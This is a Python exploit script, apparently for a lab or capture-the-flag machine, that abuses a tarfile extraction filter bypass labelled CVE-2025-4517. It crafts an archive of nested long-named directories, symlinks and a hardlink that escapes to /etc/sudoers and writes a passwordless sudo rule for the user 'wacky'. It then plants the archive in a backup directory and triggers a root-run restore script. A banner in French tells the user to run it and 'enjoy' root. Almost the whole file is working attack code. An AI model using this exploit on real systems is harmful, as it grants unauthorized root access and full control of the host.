import tarfile, os, io, subprocess

def banner():
    print("""
    #######################################################
    #        CVE-2025-4517 - PYTHON TARFILE BYPASS        #
    #      object: good | Privilege Escalation    #
    #      Method: Symlink + Hardlink + Path Overflow     #
    #######################################################
           .----------------.  .----------------.  .----------------.  .----------------.  .-----------------.
| .--------------. || .--------------. || .--------------. || .--------------. || .--------------. |
| |      __      | || |     _____    | || |  ________    | || |      __      | || | ____  _____  | |
| |     /  \     | || |    |_   _|   | || | |_   ___ `.  | || |     /  \     | || ||_   \|_   _| | |
| |    / /\ \    | || |      | |     | || |   | |   `. \ | || |    / /\ \    | || |  |   \ | |   | |
| |   / ____ \   | || |      | |     | || |   | |    | | | || |   / ____ \   | || |  | |\ \| |   | |
| | _/ /    \ \_ | || |     _| |_    | || |  _| |___.' / | || | _/ /    \ \_ | || | _| |_\   |_  | |
| ||____|  |____|| || |    |_____|   | || | |________.'  | || ||____|  |____|| || ||_____|\____| | |
| |              | || |              | || |              | || |              | || |              | |
| '--------------' || '--------------' || '--------------' || '--------------' || '--------------' |
 '----------------'  '----------------'  '----------------'  '----------------'  '----------------' 

 cree le payload dans cat << 'EOF' > pwn_wingdata.py

                             EOF
          
puis le lancer python3 pwn_wingdata.py
          et enjoy le root   sudo /bin/bash
    """)

def create_payload_tar(user, tar_name):
    print(f"[*] Creating malicious archive for user: {user}")
    # Payload Sudoers
    payload = f"{user} ALL=(ALL) NOPASSWD: ALL\n".encode()
    
    # 16 levels of 247-char nested directories to saturate 'filter=data'
    comp, steps, path = 'd' * 247, "abcdefghijklmnop", ""
    
    with tarfile.open(tar_name, mode="w") as tar:
        print("[*] Phase 1: Building nested directory path confusion...")
        for i in steps:
            # Add long-named directory
            d = tarfile.TarInfo(os.path.join(path, comp))
            d.type = tarfile.DIRTYPE
            tar.addfile(d)
            # Add symlink pointing to the long-named dir
            s = tarfile.TarInfo(os.path.join(path, i))
            s.type = tarfile.SYMTYPE
            s.linkname = comp
            tar.addfile(s)
            path = os.path.join(path, comp)

        print("[*] Phase 2: Creating escape symlink via path traversal...")
        linkpath = os.path.join("/".join(steps), "l" * 254)
        l = tarfile.TarInfo(linkpath)
        l.type, l.linkname = tarfile.SYMTYPE, "../" * len(steps)
        tar.addfile(l)

        print("[*] Phase 3: Tunneling to /etc/sudoers...")
        e = tarfile.TarInfo("escape")
        e.type, e.linkname = tarfile.SYMTYPE, linkpath + "/../../../../../../../etc"
        tar.addfile(e)

        # The Hardlink is the bypass: 'escape/sudoers' resolves to /etc/sudoers
        f = tarfile.TarInfo("sudoers_link")
        f.type, f.linkname = tarfile.LNKTYPE, "escape/sudoers"
        tar.addfile(f)

        print("[*] Phase 4: Injecting Sudoers payload...")
        c = tarfile.TarInfo("sudoers_link")
        c.type, c.size = tarfile.REGTYPE, len(payload)
        tar.addfile(c, fileobj=io.BytesIO(payload))

# --- MAIN EXECUTION ---
banner()
USER, TEMP_TAR = "wacky", "/tmp/backup_9999.tar"
DEST_PATH = "/opt/backup_clients/backups/backup_9999.tar"

create_payload_tar(USER, TEMP_TAR)

print(f"[*] Deploying exploit to {DEST_PATH}...")
subprocess.run(["cp", TEMP_TAR, DEST_PATH])

print("[*] Triggering root extraction...")
cmd = ["sudo", "/usr/local/bin/python3", "/opt/backup_clients/restore_backup_clients.py", "-b", "backup_9999.tar", "-r", "pwned_root"]
subprocess.run(cmd)

print("\n[+] SUCCESS! Check sudo privileges with 'sudo -l'")
